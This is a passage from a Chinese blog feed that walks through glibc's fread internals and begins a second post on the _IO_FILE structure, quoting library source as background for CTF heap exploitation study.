(_IO_file_xsgetn)<br></code></pre></td></tr></table></figure><p>我们把这段代码拆分成几个部分分别来进行分析</p><h4 id="Part-1"><a href="#Part-1" class="headerlink" title="Part-1"></a>Part-1</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (fp-&gt;_IO_buf_base == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      <span class="hljs-comment">/* Maybe we already have a push back pointer.  */</span><br>      <span class="hljs-keyword">if</span> (fp-&gt;_IO_save_base != <span class="hljs-literal">NULL</span>)<br>&#123;<br>  <span class="hljs-built_in">free</span> (fp-&gt;_IO_save_base);<br>  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;<br>&#125;<br>      _IO_doallocbuf (fp);<br>    &#125;<br></code></pre></td></tr></table></figure><p>开头是一个判断，如果 <strong>_IO_buf_base</strong> 为空即代表也许已经存在一个 <strong>push back pointer</strong>，然后会检查 <strong>_IO_save_base</strong>是否为空。如果不空，就会free掉这个指针，并且将 <strong>_IO_IN_BACKUP</strong>这一位置零。然后调用<code>_IO_doallocbuf</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// https://elixir.bootlin.com/glibc/latest/source/libio/genops.c#L342</span><br><span class="hljs-type">void</span><br>_IO_doallocbuf (FILE *fp)<br>&#123;<br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_buf_base)<br>    <span class="hljs-keyword">return</span>;<br>  <span class="hljs-keyword">if</span> (!(fp-&gt;_flags &amp; _IO_UNBUFFERED) || fp-&gt;_mode &gt; <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">if</span> (_IO_DOALLOCATE (fp) != EOF)<br>      <span class="hljs-keyword">return</span>;<br>  _IO_setb (fp, fp-&gt;_shortbuf, fp-&gt;_shortbuf+<span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>&#125;<br>libc_hidden_def (_IO_doallocbuf)<br></code></pre></td></tr></table></figure><p>这里如果<strong>fp-&gt;_IO_buf_base</strong> 非空，代表已经初始化完成，直接返回。反之在检测<strong>flag</strong>之后调用<code>_IO_DOALLOCATE</code>，其实就是<code>_IO_file_doallocate </code>函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// https://elixir.bootlin.com/glibc/latest/source/libio/filedoalloc.c#L77</span><br><span class="hljs-type">int</span><br>_IO_file_doallocate (FILE *fp)<br>&#123;<br>  <span class="hljs-type">size_t</span> size;<br>  <span class="hljs-type">char</span> *p;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> __<span class="hljs-title">stat64_t64</span> <span class="hljs-title">st</span>;</span><br><br>  size = BUFSIZ;<br>  <span class="hljs-keyword">if</span> (fp-&gt;_fileno &gt;= <span class="hljs-number">0</span> &amp;&amp; __builtin_expect (_IO_SYSSTAT (fp, &amp;st), <span class="hljs-number">0</span>) &gt;= <span class="hljs-number">0</span>)<br>    &#123;<br>      <span class="hljs-keyword">if</span> (S_ISCHR (st.st_mode))<br>&#123;<br>  <span class="hljs-comment">/* Possibly a tty.  */</span><br>  <span class="hljs-keyword">if</span> (<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> DEV_TTY_P</span><br>      DEV_TTY_P (&amp;st) ||<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>      local_isatty (fp-&gt;_fileno))<br>    fp-&gt;_flags |= _IO_LINE_BUF;<br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined _STATBUF_ST_BLKSIZE</span><br>      <span class="hljs-keyword">if</span> (st.st_blksize &gt; <span class="hljs-number">0</span> &amp;&amp; st.st_blksize &lt; BUFSIZ)<br>size = st.st_blksize;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    &#125;<br>  p = <span class="hljs-built_in">malloc</span> (size);<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (p == <span class="hljs-literal">NULL</span>))<br>    <span class="hljs-keyword">return</span> EOF;<br>  _IO_setb (fp, p, p + size, <span class="hljs-number">1</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br>libc_hidden_def (_IO_file_doallocate)<br></code></pre></td></tr></table></figure><p>这个函数主要对<code>_IO_FILE</code>进行初始化，</p><ul><li>首先，对<strong>fileno</strong>做最基本的检测，然后调用<code>__stat</code>，用于获取文件信息</li><li>然后调用malloc申请一个空间</li><li>调用<code>_IO_setb</code>,对 <strong>_IO_buf_base</strong>和 <strong>_IO_buf_end</strong>进行了赋值为刚刚申请 <strong>chunk</strong>的 <strong>p</strong>和 <strong>p+1</strong></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// https://elixir.bootlin.com/glibc/latest/source/libio/genops.c#L328</span><br><span class="hljs-type">void</span><br>_IO_setb (FILE *f, <span class="hljs-type">char</span> *b, <span class="hljs-type">char</span> *eb, <span class="hljs-type">int</span> a)<br>&#123;<br>  <span class="hljs-keyword">if</span> (f-&gt;_IO_buf_base &amp;&amp; !(f-&gt;_flags &amp; _IO_USER_BUF))<br>    <span class="hljs-built_in">free</span> (f-&gt;_IO_buf_base);<br>  f-&gt;_IO_buf_base = b;<br>  f-&gt;_IO_buf_end = eb;<br>  <span class="hljs-keyword">if</span> (a)<br>    f-&gt;_flags &amp;= ~_IO_USER_BUF;<br>  <span class="hljs-keyword">else</span><br>    f-&gt;_flags |= _IO_USER_BUF;<br>&#125;<br>libc_hidden_def (_IO_setb)<br></code></pre></td></tr></table></figure><h4 id="Part-2"><a href="#Part-2" class="headerlink" title="Part-2"></a>Part-2</h4><p>这里开始便是读入的主体部分</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">while</span> (want &gt; <span class="hljs-number">0</span>)<br>    &#123;<br>      have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;<br>      <span class="hljs-keyword">if</span> (want &lt;= have)<br>&#123;<br>  <span class="hljs-built_in">memcpy</span> (s, fp-&gt;_IO_read_ptr, want);<br>  fp-&gt;_IO_read_ptr += want;<br>  want = <span class="hljs-number">0</span>;<br>&#125;<br>      <span class="hljs-keyword">else</span><br>&#123;<br>  <span class="hljs-keyword">if</span> (have &gt; <span class="hljs-number">0</span>)<br>    &#123;<br>      s = __mempcpy (s, fp-&gt;_IO_read_ptr, have);<br>      want -= have;<br>      fp-&gt;_IO_read_ptr += have;<br>    &#125;<br><br>  <span class="hljs-comment">/* Check for backup and repeat */</span><br>  <span class="hljs-keyword">if</span> (_IO_in_backup (fp))<br>    &#123;<br>      _IO_switch_to_main_get_area (fp);<br>      <span class="hljs-keyword">continue</span>;<br>    &#125;<br><br>  <span class="hljs-comment">/* If we now want less than a buffer, underflow and repeat</span><br><span class="hljs-comment">     the copy.  Otherwise, _IO_SYSREAD directly to</span><br><span class="hljs-comment">     the user buffer. */</span><br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_buf_base<br>      &amp;&amp; want &lt; (<span class="hljs-type">size_t</span>) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))<br>    &#123;<br>      <span class="hljs-keyword">if</span> (__underflow (fp) == EOF)<br><span class="hljs-keyword">break</span>;<br><br>      <span class="hljs-keyword">continue</span>;<br>    &#125;<br><br>  <span class="hljs-comment">/* These must be set before the sysread as we might longjmp out</span><br><span class="hljs-comment">     waiting for input. */</span><br>  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);<br>  _IO_setp (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);<br><br>  <span class="hljs-comment">/* Try to maintain alignment: read a whole number of blocks.  */</span><br>  count = want;<br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_buf_base)<br>    &#123;<br>      <span class="hljs-type">size_t</span> block_size = fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base;<br>      <span class="hljs-keyword">if</span> (block_size &gt;= <span class="hljs-number">128</span>)<br>count -= want % block_size;<br>    &#125;<br><br>  count = _IO_SYSREAD (fp, s, count);<br>  <span class="hljs-keyword">if</span> (count &lt;= <span class="hljs-number">0</span>)<br>    &#123;<br>      <span class="hljs-keyword">if</span> (count == <span class="hljs-number">0</span>)<br>fp-&gt;_flags |= _IO_EOF_SEEN;<br>      <span class="hljs-keyword">else</span><br>fp-&gt;_flags |= _IO_ERR_SEEN;<br><br>      <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>  s += count;<br>  want -= count;<br>  <span class="hljs-keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)<br>    _IO_pos_adjust (fp-&gt;_offset, count);<br>&#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>可以看到如果，需要读入的长度小于当前<code>_IO_read_end</code>到<code>_IO_read_ptr</code>的区间，就会直接用<code>memcpy</code>进行拷贝赋值。如果不足的话，就会不断调整指针同样用<code>memcpy</code> 进行拷贝。直到读完成，然后返回<strong>n-want</strong> 即总读入字符数。</p><h4 id="part-3"><a href="#part-3" class="headerlink" title="part-3"></a>part-3</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">......<br><span class="hljs-comment">/* If we now want less than a buffer, underflow and repeat</span><br><span class="hljs-comment">     the copy.  Otherwise, _IO_SYSREAD directly to</span><br><span class="hljs-comment">     the user buffer. */</span><br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_buf_base<br>      &amp;&amp; want &lt; (<span class="hljs-type">size_t</span>) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))<br>    &#123;<br>      <span class="hljs-keyword">if</span> (__underflow (fp) == EOF)<br><span class="hljs-keyword">break</span>;<br><br>      <span class="hljs-keyword">continue</span>;<br>    &#125;<br>......  <br></code></pre></td></tr></table></figure><p>在读入的过程中，如果遇到空间不足的情况，会调用<code>__underflow</code>去执行系统调用<code>read</code>读取数据，并放入到输入缓冲区里。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// https://elixir.bootlin.com/glibc/latest/source/libio/genops.c#L268</span><br><span class="hljs-type">int</span><br>__underflow (FILE *fp)<br>&#123;<br>  <span class="hljs-keyword">if</span> (_IO_vtable_offset (fp) == <span class="hljs-number">0</span> &amp;&amp; _IO_fwide (fp, <span class="hljs-number">-1</span>) != <span class="hljs-number">-1</span>)<br>    <span class="hljs-keyword">return</span> EOF;<br><br>  <span class="hljs-keyword">if</span> (fp-&gt;_mode == <span class="hljs-number">0</span>)<br>    _IO_fwide (fp, <span class="hljs-number">-1</span>);<br>  <span class="hljs-keyword">if</span> (_IO_in_put_mode (fp))<br>    <span class="hljs-keyword">if</span> (_IO_switch_to_get_mode (fp) == EOF)<br>      <span class="hljs-keyword">return</span> EOF;<br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)<br>    <span class="hljs-keyword">return</span> *(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *) fp-&gt;_IO_read_ptr;<br>  <span class="hljs-keyword">if</span> (_IO_in_backup (fp))<br>    &#123;<br>      _IO_switch_to_main_get_area (fp);<br>      <span class="hljs-keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)<br><span class="hljs-keyword">return</span> *(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *) fp-&gt;_IO_read_ptr;<br>    &#125;<br>  <span class="hljs-keyword">if</span> (_IO_have_markers (fp))<br>    &#123;<br>      <span class="hljs-keyword">if</span> (save_for_backup (fp, fp-&gt;_IO_read_end))<br><span class="hljs-keyword">return</span> EOF;<br>    &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (_IO_have_backup (fp))<br>    _IO_free_backup_area (fp);<br>  <span class="hljs-keyword">return</span> _IO_UNDERFLOW (fp);<br>&#125;<br>libc_hidden_def (__underflow)<br></code></pre></td></tr></table></figure><p>在对<strong>flag</strong>进行一系列检测后，会调用<code>_IO_UNDERFLOW</code>函数，同样利用动调，我们找到这个函数就是<code>_IO_file_underflow</code>，实际在源码中为<code>_IO_new_file_underflow</code></p><p><img src="/img/article/fread/image-20221207200035078.png" alt="image-20221207200035078"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// https://elixir.bootlin.com/glibc/latest/source/libio/fileops.c#L460</span><br><span class="hljs-type">int</span><br>_IO_new_file_underflow (FILE *fp)<br>&#123;<br>  <span class="hljs-type">ssize_t</span> count;<br><br>  <span class="hljs-comment">/* C99 requires EOF to be &quot;sticky&quot;.  */</span><br>  <span class="hljs-keyword">if</span> (fp-&gt;_flags &amp; _IO_EOF_SEEN)<br>    <span class="hljs-keyword">return</span> EOF;<br><br>  <span class="hljs-keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_READS)<br>    &#123;<br>      fp-&gt;_flags |= _IO_ERR_SEEN;<br>      __set_errno (EBADF);<br>      <span class="hljs-keyword">return</span> EOF;<br>    &#125;<br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)<br>    <span class="hljs-keyword">return</span> *(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *) fp-&gt;_IO_read_ptr;<br><br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_buf_base == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      <span class="hljs-comment">/* Maybe we already have a push back pointer.  */</span><br>      <span class="hljs-keyword">if</span> (fp-&gt;_IO_save_base != <span class="hljs-literal">NULL</span>)<br>&#123;<br>  <span class="hljs-built_in">free</span> (fp-&gt;_IO_save_base);<br>  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;<br>&#125;<br>      _IO_doallocbuf (fp);<br>    &#125;<br><br>  <span class="hljs-comment">/* FIXME This can/should be moved to genops ?? */</span><br>  <span class="hljs-keyword">if</span> (fp-&gt;_flags &amp; (_IO_LINE_BUF|_IO_UNBUFFERED))<br>    &#123;<br>      <span class="hljs-comment">/* We used to flush all line-buffered stream.  This really isn&#x27;t</span><br><span class="hljs-comment"> required by any standard.  My recollection is that</span><br><span class="hljs-comment"> traditional Unix systems did this for stdout.  stderr better</span><br><span class="hljs-comment"> not be line buffered.  So we do just that here</span><br><span class="hljs-comment"> explicitly.  --drepper */</span><br>      _IO_acquire_lock (<span class="hljs-built_in">stdout</span>);<br><br>      <span class="hljs-keyword">if</span> ((<span class="hljs-built_in">stdout</span>-&gt;_flags &amp; (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF))<br>  == (_IO_LINKED | _IO_LINE_BUF))<br>_IO_OVERFLOW (<span class="hljs-built_in">stdout</span>, EOF);<br><br>      _IO_release_lock (<span class="hljs-built_in">stdout</span>);<br>    &#125;<br><br>  _IO_switch_to_get_mode (fp);<br><br>  <span class="hljs-comment">/* This is very tricky. We have to adjust those</span><br><span class="hljs-comment">     pointers before we call _IO_SYSREAD () since</span><br><span class="hljs-comment">     we may longjump () out while waiting for</span><br><span class="hljs-comment">     input. Those pointers may be screwed up. H.J. */</span><br>  fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;<br>  fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;<br>  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end<br>    = fp-&gt;_IO_buf_base;<br><br>  count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,<br>       fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);<br>  <span class="hljs-keyword">if</span> (count &lt;= <span class="hljs-number">0</span>)<br>    &#123;<br>      <span class="hljs-keyword">if</span> (count == <span class="hljs-number">0</span>)<br>fp-&gt;_flags |= _IO_EOF_SEEN;<br>      <span class="hljs-keyword">else</span><br>fp-&gt;_flags |= _IO_ERR_SEEN, count = <span class="hljs-number">0</span>;<br>  &#125;<br>  fp-&gt;_IO_read_end += count;<br>  <span class="hljs-keyword">if</span> (count == <span class="hljs-number">0</span>)<br>    &#123;<br>      <span class="hljs-comment">/* If a stream is read to EOF, the calling application may switch active</span><br><span class="hljs-comment"> handles.  As a result, our offset cache would no longer be valid, so</span><br><span class="hljs-comment"> unset it.  */</span><br>      fp-&gt;_offset = _IO_pos_BAD;<br>      <span class="hljs-keyword">return</span> EOF;<br>    &#125;<br>  <span class="hljs-keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)<br>    _IO_pos_adjust (fp-&gt;_offset, count);<br>  <span class="hljs-keyword">return</span> *(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *) fp-&gt;_IO_read_ptr;<br>&#125;<br>libc_hidden_ver (_IO_new_file_underflow, _IO_file_underflow)<br></code></pre></td></tr></table></figure><p>这个函数主要做了这几件事：</p><ul><li>首先进行一些检查，包括<strong>flag</strong>以及一些指针的合法性</li><li>然后对 <strong>_IO_read_base， _IO_read_ptr， _IO_read_end， _IO_write_base</strong>指针均设置为 <strong>fp-&gt;_IO_buf_base</strong></li><li>调用<code>_IO_SYSREAD </code> ,该函数最终执行系统调用read，读取文件数据，数据读入到<code>fp-&gt;_IO_buf_base</code>中，读入大小为输入缓冲区的大小<code>fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base</code>。</li><li>设置输入缓冲区已有数据的size，即设置<code>fp-&gt;_IO_read_end</code>为<code>fp-&gt;_IO_read_end += count</code>。</li></ul><p>随后不断退出函数，直至结束</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【IO_FILE】源码详解</title>
    <link href="/2022/11/29/%E3%80%90IO_FILE%E3%80%91%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86%E6%A6%82%E8%A7%88/"/>
    <url>/2022/11/29/%E3%80%90IO_FILE%E3%80%91%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86%E6%A6%82%E8%A7%88/</url>
    
    <content type="html"><![CDATA[<blockquote><p>由于glibc版本的不断更新，常见几种hook在glibc2.34终被舍去，我们急需一种能够在高版本的glibc下仍能有效的getshell方法。而IO_FILE作为heap题目的进阶技能逐渐引起大家注意，吸引了许多大佬投入其中。仅在在2021-2022年期间就出现出现了大量以IO_FILE为基础的调用链利用方式，在比赛中也逐渐成为了当下heap题目的主流getshell方式。本文以glibc2.36为例，从相关结构体以及fopen函数源码入手，详细介绍IO_FILE相关知识点。</p></blockquote><h2 id="IO-FILE"><a href="#IO-FILE" class="headerlink" title="_IO_FILE"></a>_IO_FILE</h2><p>IO_FILE结构体定义为<code>struct _IO_FILE</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* The tag name of this struct is _IO_FILE to preserve historic</span><br><span class="hljs-comment">   C++ mangled names for functions taking FILE* arguments.</span><br><span class="hljs-comment">   That name should not be used in new code.  */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">int</span> _flags;<span class="hljs-comment">/* High-order word is _IO_MAGIC; rest is flags. */</span><br><br>  <span class="hljs-comment">/* The following pointers correspond to the C++ streambuf protocol. */</span><br>  <span class="hljs-type">char</span> *_IO_read_ptr;<span class="hljs-comment">/* Current read pointer */</span><br>  <span class="hljs-type">char</span> *_IO_read_end;<span class="hljs-comment">/* End of get area. */</span><br>  <span class="hljs-type">char</span> *_IO_read_base;<span class="hljs-comment">/* Start of putback+get area. */</span><br>  <span class="hljs-type">char</span> *_IO_write_base;<span class="hljs-comment">/* Start of put area. */</span><br>  <span class="hljs-type">char</span> *_IO_write_ptr;<span class="hljs-comment">/* Current put pointer. */</span><br>  <span class="hljs-type">char</span> *_IO_write_end;<span class="hljs-comment">/* End of put area. */</span><br>  <span class="hljs-type">char</span> *_IO_buf_base;<span class="hljs-comment">/* Start of reserve area. */</span><br>  <span class="hljs-type">char</span> *_IO_buf_end;<span class="hljs-comment">/* End of reserve area. */</span><br><br>  <span class="hljs-comment">/* The following fields are used to support backing up and undo. */</span><br>  <span class="hljs-type">char</span> *_IO_save_base; <span class="hljs-comment">/* Pointer to start of non-current get area. */</span><br>  <span class="hljs-type">char</span> *_IO_backup_base;  <span class="hljs-comment">/* Pointer to first valid character of backup area */</span><br>  <span class="hljs-type">char</span> *_IO_save_end; <span class="hljs-comment">/* Pointer to end of non-current get area. */</span><br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_marker</span> *_<span class="hljs-title">markers</span>;</span><br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> *_<span class="hljs-title">chain</span>;</span><br><br>  <span class="hljs-type">int</span> _fileno;<br>  <span class="hljs-type">int</span> _flags2;<br>  <span class="hljs-type">__off_t</span> _old_offset; <span class="hljs-comment">/* This used to be _offset but it&#x27;s too small.  */</span><br><br>  <span class="hljs-comment">/* 1+column number of pbase(); 0 is unknown. */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> _cur_column;<br>  <span class="hljs-type">signed</span> <span class="hljs-type">char</span> _vtable_offset;<br>  <span class="hljs-type">char</span> _shortbuf[<span class="hljs-number">1</span>];<br><br>  _IO_lock_t *_lock;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_complete</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> _<span class="hljs-title">file</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  <span class="hljs-type">__off64_t</span> _offset;<br>  <span class="hljs-comment">/* Wide character stream stuff.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_codecvt</span> *_<span class="hljs-title">codecvt</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_wide_data</span> *_<span class="hljs-title">wide_data</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> *_<span class="hljs-title">freeres_list</span>;</span><br>  <span class="hljs-type">void</span> *_freeres_buf;<br>  <span class="hljs-type">size_t</span> __pad5;<br>  <span class="hljs-type">int</span> _mode;<br>  <span class="hljs-comment">/* Make sure we don&#x27;t get into trouble again.  */</span><br>  <span class="hljs-type">char</span> 